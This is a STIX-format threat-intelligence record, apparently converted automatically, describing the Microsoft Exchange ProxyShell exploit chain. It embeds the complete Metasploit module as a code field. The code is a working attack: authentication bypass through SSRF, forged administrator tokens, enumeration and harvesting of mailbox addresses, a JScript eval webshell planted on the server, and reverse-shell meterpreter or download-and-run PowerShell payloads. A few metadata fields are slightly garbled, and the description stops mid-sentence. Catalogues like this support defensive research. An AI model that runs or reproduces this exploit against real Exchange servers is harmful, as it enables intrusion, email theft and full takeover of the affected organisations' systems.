{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f2bce53-ec93-4e2f-a34c-de704186ad12",
    "created": "2024-08-14T16:54:21.574494Z",
    "modified": "2024-08-14T16:54:21.574498Z",
    "name": "Microsoft Exchange ProxyShell RCE",
    "description": " This module exploits a vulnerability on Microsoft Exchange Server that",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/exchange_proxyshell_rce.rb",
            "external_id": "exchange_proxyshell_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-34473"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-34523"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31207"
        },
        {
            "source_name": "reference",
            "url": "https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1"
        },
        {
            "source_name": "reference",
            "url": "https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/dmaasland/proxyshell-poc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange ProxyShell RCE',\n        'Description' => %q{\n          This module exploits a vulnerability on Microsoft Exchange Server that\n          allows an attacker to bypass the authentication (CVE-2021-31207), impersonate an\n          arbitrary user (CVE-2021-34523) and write an arbitrary file (CVE-2021-34473) to achieve\n          the RCE (Remote Code Execution).\n\n          By taking advantage of this vulnerability, you can execute arbitrary\n          commands on the remote Microsoft Exchange Server.\n\n          This vulnerability affects Exchange 2013 CU23 < 15.0.1497.15,\n          Exchange 2016 CU19 < 15.1.2176.12, Exchange 2016 CU20 < 15.1.2242.5,\n          Exchange 2019 CU8 < 15.2.792.13, Exchange 2019 CU9 < 15.2.858.9.\n\n          All components are vulnerable by default.\n        },\n        'Author' => [\n          'Orange Tsai', # Discovery\n          'Jang (@testanull)', # Vulnerability analysis\n          'PeterJson', # Vulnerability analysis\n          'brandonshi123', # Vulnerability analysis\n          'mekhalleh (RAMELLA S\u00e9bastien)', # exchange_proxylogon_rce template\n          'Donny Maasland', # Procedure optimizations (email enumeration)\n          'Rich Warren', # Procedure optimizations (email enumeration)\n          'Spencer McIntyre', # Metasploit module\n          'wvu' # Testing\n        ],\n        'References' => [\n          [ 'CVE', '2021-34473' ],\n          [ 'CVE', '2021-34523' ],\n          [ 'CVE', '2021-31207' ],\n          [ 'URL', 'https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1' ],\n          [ 'URL', 'https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf' ],\n          [ 'URL', 'https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/' ],\n          [ 'URL', 'https://github.com/dmaasland/proxyshell-poc' ]\n        ],\n        'DisclosureDate' => '2021-04-06', # pwn2own 2021\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Platform' => ['windows'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Windows Powershell',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_powershell,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_X64, ARCH_X86],\n              'Type' => :windows_dropper,\n              'CmdStagerFlavor' => %i[psh_invokewebrequest],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => 'psh_invokewebrequest'\n              }\n            }\n          ],\n          [\n            'Windows Command',\n            {\n              'Platform' => 'windows',\n              'Arch' => [ARCH_CMD],\n              'Type' => :windows_command,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'AKA' => ['ProxyShell'],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EMAIL', [false, 'A known email address for this organization']),\n      OptBool.new('UseAlternatePath', [true, 'Use the IIS root dir as alternate path', false]),\n    ])\n\n    register_advanced_options([\n      OptString.new('BackendServerName', [false, 'Force the name of the backend Exchange server targeted']),\n      OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15']),\n      OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\\\auth']),\n      OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\\\inetpub\\\\wwwroot']),\n      OptString.new('IISWritePath', [true, 'The path where you want to write the backdoor', 'aspnet_client']),\n      OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002'])\n    ])\n  end\n\n  def check\n    @ssrf_email ||= Faker::Internet.email\n    res = send_http('GET', '/mapi/nspi/')\n    return CheckCode::Unknown if res.nil?\n    return CheckCode::Safe unless res.code == 200 && res.get_html_document.xpath('//head/title').text == 'Exchange MAPI/HTTP Connectivity Endpoint'\n\n    CheckCode::Vulnerable\n  end\n\n  def cmd_windows_generic?\n    datastore['PAYLOAD'] == 'cmd/windows/generic'\n  end\n\n  def encode_cmd(cmd)\n    cmd.gsub!('\\\\', '\\\\\\\\\\\\')\n    cmd.gsub('\"', '\\u0022').gsub('&', '\\u0026').gsub('+', '\\u002b')\n  end\n\n  def random_mapi_id\n    id = \"{#{Rex::Text.rand_text_hex(8)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(4)}\"\n    id = \"#{id}-#{Rex::Text.rand_text_hex(12)}}\"\n    id.upcase\n  end\n\n  def request_autodiscover(email)\n    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }\n\n    response = send_http(\n      'POST',\n      '/autodiscover/autodiscover.xml',\n      data: XMLTemplate.render('soap_autodiscover', email: email),\n      ctype: 'text/xml; charset=utf-8'\n    )\n\n    case response.body\n    when %r{<ErrorCode>500</ErrorCode>}\n      fail_with(Failure::NotFound, 'No Autodiscover information was found')\n    when %r{<Action>redirectAddr</Action>}\n      fail_with(Failure::NotFound, 'No email address was found')\n    end\n\n    xml = Nokogiri::XML.parse(response.body)\n\n    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content\n    fail_with(Failure::NotFound, 'No \\'LegacyDN\\' was found') if legacy_dn.nil? || legacy_dn.empty?\n\n    server = ''\n    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|\n      type = item.at_xpath('./xmlns:Type', xmlns)&.content\n      if type == 'EXCH'\n        server = item.at_xpath('./xmlns:Server', xmlns)&.content\n      end\n    end\n    fail_with(Failure::NotFound, 'No \\'Server ID\\' was found') if server.nil? || server.empty?\n\n    { server: server, legacy_dn: legacy_dn }\n  end\n\n  def request_fqdn\n    ntlm_ssp = \"NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x05\\x02\\x88\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    received = send_request_raw(\n      'method' => 'RPC_IN_DATA',\n      'uri' => normalize_uri('rpc', 'rpcproxy.dll'),\n      'headers' => {\n        'Authorization' => \"NTLM #{Rex::Text.encode_base64(ntlm_ssp)}\"\n      }\n    )\n    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received\n\n    if received.code == 401 && received['WWW-Authenticate'] && received['WWW-Authenticate'].match(/^NTLM/i)\n      hash = received['WWW-Authenticate'].split('NTLM ')[1]\n      message = Net::NTLM::Message.parse(Rex::Text.decode_base64(hash))\n      dns_server = Net::NTLM::TargetInfo.new(message.target_info).av_pairs[Net::NTLM::TargetInfo::MSV_AV_DNS_COMPUTER_NAME]\n\n      return dns_server.force_encoding('UTF-16LE').encode('UTF-8').downcase\n    end\n\n    fail_with(Failure::NotFound, 'No Backend server was found')\n  end\n\n  # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/c245390b-b115-46f8-bc71-03dce4a34bff\n  def request_mapi(legacy_dn)\n    data = \"#{legacy_dn}\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00\"\n    headers = {\n      'X-RequestType' => 'Connect',\n      'X-ClientInfo' => random_mapi_id,\n      'X-ClientApplication' => datastore['MapiClientApp'],\n      'X-RequestId' => \"#{random_mapi_id}:#{Rex::Text.rand_text_numeric(5)}\"\n    }\n\n    sid = ''\n    response = send_http(\n      'POST',\n      '/mapi/emsmdb',\n      data: data,\n      ctype: 'application/mapi-http',\n      headers: headers\n    )\n    if response&.code == 200\n      sid = response.body.match(/S-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*/).to_s\n    end\n    fail_with(Failure::NotFound, 'No \\'SID\\' was found') if sid.empty?\n\n    sid\n  end\n\n  def get_sid_for_email(email)\n    autodiscover = request_autodiscover(email)\n    request_mapi(autodiscover[:legacy_dn])\n  end\n\n  # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.\n  def exploit_setup\n    if datastore['BackendServerName'] && !datastore['BackendServerName'].empty?\n      server_name = datastore['BackendServerName']\n      print_status(\"Internal server name forced to: #{server_name}\")\n    else\n      print_status('Retrieving backend FQDN over RPC request')\n      server_name = request_fqdn\n      print_status(\"Internal server name: #{server_name}\")\n    end\n    @backend_server_name = server_name\n\n    get_common_access_token\n    print_good('Successfully assigned the \\'Mailbox Import Export\\' role')\n    print_good(\"Proceeding with SID: #{@mailbox_user_sid} (#{@mailbox_user_email})\")\n  end\n\n  def probe_powershell_backend(common_access_token)\n    powershell_probe = send_http('GET', \"/PowerShell/?X-Rps-CAT=#{common_access_token}\")\n    fail_with(Failure::UnexpectedReply, 'Failed to access the PowerShell backend') unless powershell_probe&.code == 200\n  end\n\n  # this function doesn't return unless it's successful\n  def get_common_access_token\n    # get a SID from the specified email address\n    email_address = datastore['EMAIL']\n    unless email_address.blank?\n      sid = get_sid_for_email(email_address)\n      vprint_status(\"SID: #{sid} (#{email_address})\")\n      common_access_token = build_token(sid)\n      probe_powershell_backend(common_access_token)\n\n      print_status(\"Assigning the 'Mailbox Import Export' role via #{email_address}\")\n      role_assigned = execute_powershell('New-ManagementRoleAssignment', cat: common_access_token, args: [\n        { name: '-Role', value: 'Mailbox Import Export' },\n        { name: '-User', value: email_address }\n      ])\n      unless role_assigned\n        fail_with(Failure::BadConfig, 'The specified email address does not have the \\'Mailbox Import Export\\' role and can not self-assign it')\n      end\n\n      @mailbox_user_sid = sid\n      @mailbox_user_email = email_address\n      @common_access_token = common_access_token\n      return\n    end\n\n    print_status('Enumerating valid email addresses and searching for one that either has the \\'Mailbox Import Export\\' role or can self-assign it')\n    get_emails.each do |this_email_address|\n      next if this_email_address == email_address # already tried this one\n\n      vprint_status(\"Reattempting to assign the 'Mailbox Import Export' role via #{this_email_address}\")\n      begin\n        this_sid = get_sid_for_email(this_email_address)\n      rescue RuntimeError\n        print_error(\"Failed to identify the SID for #{this_email_address}\")\n        next\n      end\n\n      common_access_token = build_token(this_sid)\n      role_assigned = execute_powershell('New-ManagementRoleAssignment', cat: common_access_token, args: [\n        { name: '-Role', value: 'Mailbox Import Export' },\n        { name: '-User', value: this_email_address }\n      ])\n      next unless role_assigned\n\n      @mailbox_user_sid = this_sid\n      @mailbox_user_email = this_email_address\n      @common_access_token = common_access_token\n      return # rubocop:disable Lint/NonLocalExitFromIterator\n    end\n\n    fail_with(Failure::NoAccess, 'No user with the necessary management role was identified')\n  end\n\n  def send_http(method, uri, opts = {})\n    ssrf = \"Autodiscover/autodiscover.json?a=#{@ssrf_email}\"\n    opts[:cookie] = \"Email=#{ssrf}\"\n    super(method, \"/#{ssrf}#{uri}\", opts)\n  end\n\n  def get_emails\n    mailbox_table = Rex::Text::Table.new(\n      'Header' => 'Exchange Mailboxes',\n      'Columns' => %w[EmailAddress Name RoutingType MailboxType]\n    )\n\n    MailboxEnumerator.new(self).each do |row|\n      mailbox_table << row\n    end\n\n    print_status(\"Enumerated #{mailbox_table.rows.length} email addresses\")\n    stored_path = store_loot('ad.exchange.mailboxes', 'text/csv', rhost, mailbox_table.to_csv)\n    print_status(\"Saved mailbox and email address data to: #{stored_path}\")\n\n    mailbox_table.rows.map(&:first)\n  end\n\n  def create_embedded_draft(user_sid)\n    @shell_input_name = rand_text_alphanumeric(8..12)\n    @draft_subject = rand_text_alphanumeric(8..12)\n    print_status(\"Saving a draft email with subject '#{@draft_subject}' containing the attachment with the embedded webshell\")\n    payload = Rex::Text.encode_base64(PstEncoding.encode(\"#<script language=\\\"JScript\\\" runat=\\\"server\\\">function Page_Load(){eval(Request[\\\"#{@shell_input_name}\\\"],\\\"unsafe\\\");}</script>\"))\n    file_name = \"#{Faker::Lorem.word}#{%w[- _].sample}#{Faker::Lorem.word}.#{%w[rtf pdf docx xlsx pptx zip].sample}\"\n    envelope = XMLTemplate.render('soap_draft', user_sid: user_sid, file_content: payload, file_name: file_name, subject: @draft_subject)\n\n    send_http('POST', '/ews/exchange.asmx', data: envelope, ctype: 'text/xml;charset=UTF-8')\n  end\n\n  def web_directory\n    if datastore['UseAlternatePath']\n      datastore['IISWritePath'].gsub('\\\\', '/')\n    else\n      datastore['ExchangeWritePath'].gsub('\\\\', '/')\n    end\n  end\n\n  def build_token(sid)\n    uint8_tlv = proc do |type, value|\n      type + [value.length].pack('C') + value\n    end\n\n    token = uint8_tlv.call('V', \"\\x00\")\n    token << uint8_tlv.call('T', 'Windows')\n    token << \"\\x43\\x00\"\n    token << uint8_tlv.call('A', 'Kerberos')\n    token << uint8_tlv.call('L', 'Administrator')\n    token << uint8_tlv.call('U', sid)\n\n    # group data for S-1-5-32-544\n    token << \"\\x47\\x01\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x0c\\x53\\x2d\\x31\\x2d\\x35\\x2d\\x33\\x32\\x2d\\x35\\x34\\x34\\x45\\x00\\x00\\x00\\x00\"\n    Rex::Text.encode_base64(token)\n  end\n\n  def exploit\n    @ssrf_email ||= Faker::Internet.email\n    print_status('Attempt to exploit for CVE-2021-34473')\n    exploit_setup\n\n    create_embedded_draft(@mailbox_user_sid)\n    @shell_filename = \"#{rand_text_alphanumeric(8..12)}.aspx\"\n    if datastore['UseAlternatePath']\n      unc_path = \"#{datastore['IISBasePath'].split(':')[1]}\\\\#{datastore['IISWritePath']}\"\n      unc_path = \"\\\\\\\\\\\\\\\\#{@backend_server_name}\\\\#{datastore['IISBasePath'].split(':')[0]}$#{unc_path}\\\\#{@shell_filename}\"\n    else\n      unc_path = \"#{datastore['ExchangeBasePath'].split(':')[1]}\\\\FrontEnd\\\\HttpProxy\\\\#{datastore['ExchangeWritePath']}\"\n      unc_path = \"\\\\\\\\\\\\\\\\#{@backend_server_name}\\\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{unc_path}\\\\#{@shell_filename}\"\n    end\n\n    normal_path = unc_path.gsub(/^\\\\+[\\w.-]+\\\\(.)\\$\\\\/, '\\1:\\\\')\n    print_status(\"Writing to: #{normal_path}\")\n    register_file_for_cleanup(normal_path)\n\n    @export_name = rand_text_alphanumeric(8..12)\n    successful = execute_powershell('New-MailboxExportRequest', cat: @common_access_token, args: [\n      { name: '-Name', value: @export_name },\n      { name: '-Mailbox', value: @mailbox_user_email },\n      { name: '-IncludeFolders', value: '#Drafts#' },\n      { name: '-ContentFilter', value: \"(Subject -eq '#{@draft_subject}')\" },\n      { name: '-ExcludeDumpster' },\n      { name: '-FilePath', value: unc_path }\n    ])\n    fail_with(Failure::UnexpectedReply, 'The mailbox export request failed') unless successful\n\n    exported = false\n    print_status('Waiting for the export request to complete...')\n    30.times do\n      sleep 5\n      next unless send_request_cgi('uri' => normalize_uri(web_directory, @shell_filename))&.code == 200\n\n      print_good('The mailbox export request has completed')\n      exported = true\n      break\n    end\n\n    fail_with(Failure::Unknown, 'The mailbox export request timed out') unless exported\n\n    print_status('Triggering the payload')\n    case target['Type']\n    when :windows_command\n      vprint_status(\"Generated payload: #{payload.encoded}\")\n\n      if !cmd_windows_generic?\n        execute_command(payload.encoded)\n      else\n        boundary = rand_text_alphanumeric(8..12)\n        response = execute_command(\"cmd /c echo START#{boundary}&#{payload.encoded}&echo END#{boundary}\")\n\n        print_warning('Dumping command output in response')\n        if response.body =~ /START#{boundary}(.*)END#{boundary}/m\n          print_line(Regexp.last_match(1).strip)\n        else\n          print_error('Empty response, no command output')\n        end\n      end\n    when :windows_dropper\n      execute_command(generate_cmdstager(concat_operator: ';').join)\n    when :windows_powershell\n      cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)\n      execute_command(cmd)\n    end\n  end\n\n  def cleanup\n    super\n    return unless @common_access_token && @export_name\n\n    print_status('Removing the mailbox export request')\n    execute_powershell('Remove-MailboxExportRequest', cat: @common_access_token, args: [\n      { name: '-Identity', value: \"#{@mailbox_user_email}\\\\#{@export_name}\" },\n      { name: '-Confirm', value: false }\n    ])\n\n    print_status('Removing the draft email')\n    execute_powershell('Search-Mailbox', cat: @common_access_token, args: [\n      { name: '-Identity', value: @mailbox_user_email },\n      { name: '-SearchQuery', value: \"Subject:\\\"#{@draft_subject}\\\"\" },\n      { name: '-Force' },\n      { name: '-DeleteContent' }\n    ])\n  end\n\n  def execute_command(cmd, _opts = {})\n    if !cmd_windows_generic?\n      cmd = \"Response.Write(new ActiveXObject(\\\"WScript.Shell\\\").Exec(\\\"#{encode_cmd(cmd)}\\\"));\"\n    else\n      cmd = \"Response.Write(new ActiveXObject(\\\"WScript.Shell\\\").Exec(\\\"#{encode_cmd(cmd)}\\\").StdOut.ReadAll());\"\n    end\n\n    send_request_raw(\n      'method' => 'POST',\n      'uri' => normalize_uri(web_directory, @shell_filename),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'data' => \"#{@shell_input_name}=#{cmd}\"\n    )\n  end\nend\n\n# Use https://learn.microsoft.com/en-us/exchange/client-developer/web-service-reference/resolvenames to resolve mailbox\n# information. The endpoint only returns 100 at a time though so if the target has more than that many email addresses\n# multiple requests will need to be made. Since the endpoint doesn't support pagination, we refine the query by using\n# progressively larger search prefixes until there are less than 101 results and thus will fit into a single response.\nclass MailboxEnumerator\n  def initialize(mod)\n    @mod = mod\n  end\n\n  # the characters that Exchange Server 2019 allows in an alias (no unicode)\n  ALIAS_CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789!#$%&\\'*+-/=?^_`{|}~'.freeze\n  XML_NS = {\n    'm' => 'http://schemas.microsoft.com/exchange/services/2006/messages',\n    't' => 'http://schemas.microsoft.com/exchange/services/2006/types'\n  }.freeze\n\n  include Enumerable\n  XMLTemplate = Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell::XMLTemplate\n\n  def each(name: 'SMTP:', &block)\n    envelope = XMLTemplate.render('soap_getemails', name: name)\n    res = @mod.send_http('POST', '/ews/exchange.asmx', data: envelope, ctype: 'text/xml;charset=UTF-8')\n    return unless res&.code == 200\n\n    if res.get_xml_document.xpath('//m:ResolutionSet/@IncludesLastItemInRange', XML_NS).first&.text&.downcase == 'false'\n      ALIAS_CHARSET.each_char do |char|\n        each(name: name + char, &block)\n      end\n    else\n      res.get_xml_document.xpath('//t:Mailbox', XML_NS).each do |mailbox|\n        yield %w[t:EmailAddress t:Name t:RoutingType t:MailboxType].map { |xpath| mailbox.xpath(xpath, XML_NS)&.text || '' }\n      end\n    end\n  end\nend\n\nclass PstEncoding\n  ENCODE_TABLE = [\n    71, 241, 180, 230, 11, 106, 114, 72,\n    133, 78, 158, 235, 226, 248, 148, 83,\n    224, 187, 160, 2, 232, 90, 9, 171,\n    219, 227, 186, 198, 124, 195, 16, 221,\n    57, 5, 150, 48, 245, 55, 96, 130,\n    140, 201, 19, 74, 107, 29, 243, 251,\n    143, 38, 151, 202, 145, 23, 1, 196,\n    50, 45, 110, 49, 149, 255, 217, 35,\n    209, 0, 94, 121, 220, 68, 59, 26,\n    40, 197, 97, 87, 32, 144, 61, 131,\n    185, 67, 190, 103, 210, 70, 66, 118,\n    192, 109, 91, 126, 178, 15, 22, 41,\n    60, 169, 3, 84, 13, 218, 93, 223,\n    246, 183, 199, 98, 205, 141, 6, 211,\n    105, 92, 134, 214, 20, 247, 165, 102,\n    117, 172, 177, 233, 69, 33, 112, 12,\n    135, 159, 116, 164, 34, 76, 111, 191,\n    31, 86, 170, 46, 179, 120, 51, 80,\n    176, 163, 146, 188, 207, 25, 28, 167,\n    99, 203, 30, 77, 62, 75, 27, 155,\n    79, 231, 240, 238, 173, 58, 181, 89,\n    4, 234, 64, 85, 37, 81, 229, 122,\n    137, 56, 104, 82, 123, 252, 39, 174,\n    215, 189, 250, 7, 244, 204, 142, 95,\n    239, 53, 156, 132, 43, 21, 213, 119,\n    52, 73, 182, 18, 10, 127, 113, 136,\n    253, 157, 24, 65, 125, 147, 216, 88,\n    44, 206, 254, 36, 175, 222, 184, 54,\n    200, 161, 128, 166, 153, 152, 168, 47,\n    14, 129, 101, 115, 228, 194, 162, 138,\n    212, 225, 17, 208, 8, 139, 42, 242,\n    237, 154, 100, 63, 193, 108, 249, 236\n  ].freeze\n\n  def self.encode(data)\n    encoded = ''\n    data.each_char do |char|\n      encoded << ENCODE_TABLE[char.ord].chr\n    end\n    encoded\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-04-06, # pwn2own 2021",
    "x_mitre_platforms": [
        "windows'"
    ]
}